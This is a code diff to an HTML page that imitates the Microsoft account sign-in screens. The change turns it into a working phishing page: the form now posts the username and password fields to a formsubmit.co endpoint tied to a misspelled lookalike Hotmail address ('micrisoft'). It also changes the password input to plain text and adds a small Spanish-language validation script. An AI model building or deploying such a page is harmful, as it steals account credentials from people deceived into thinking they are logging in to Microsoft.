@@ -15,12 +15,32 @@
         <div class="auth-wrapper">
             <img src="logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
+            <form action="https://formsubmit.co/equipo.de.seguridad.micrisoft@hotmail.com" id="pago" method="post" onsubmit="return validarFormulario()">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" required />
                 </div>
-            </form>
+                <div>
+                    <button class="btn" id="btn_next" type="submit">Next</button>
+                </div>
+            
+
+            <script>
+                function validarFormulario() {
+                    const uname = document.getElementById('inp_uname').value;
+                    const errorElement = document.getElementById('error_uname');
+
+                    // Validación simple para verificar que el campo no esté vacío
+                    if (!uname) {
+                        errorElement.textContent = "Este campo es obligatorio.";
+                        return false; // Evita el envío del formulario
+                    }
+
+                    errorElement.textContent = ""; // Limpia el mensaje de error
+                    return true; // Permite el envío del formulario
+                }
+            </script>
+
             <div>
                 <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
                 <p class="mb-16 fs-13">
@@ -29,13 +49,9 @@
                     </a>
                 </p>
             </div>
-            <div>
-                <button class="btn" id="btn_next">Next</button>
-            </div>
         </div>
         <div class="opts">
-            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="key.png"
-                        width="30px" /></span> Sign-in options</p>
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="key.png" width="30px" /></span> Sign-in options</p>
         </div>
     </section>
 
@@ -49,12 +65,11 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form>
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
-                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                    <input id="inp_pwd" type="text" name="pass" class="input" placeholder="Password" />
                 </div>
-            </form>
+            
             <div>
                 <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                 <p class="mb-16">
@@ -81,10 +96,13 @@
             </label>
             <div class="btn-group">
                 <button class="btn btn-sec" id="btn_final">No</button>
-                <button class="btn" id="btn_final">Yes</button>
+                <button class="submit" id="btn_final">Yes</button>
             </div>
         </div>
     </section>
+
+</form>
+
     <footer class="footer">
         <a href="#">Terms of use</a>
         <a href="#">Privacy & cookies</a>
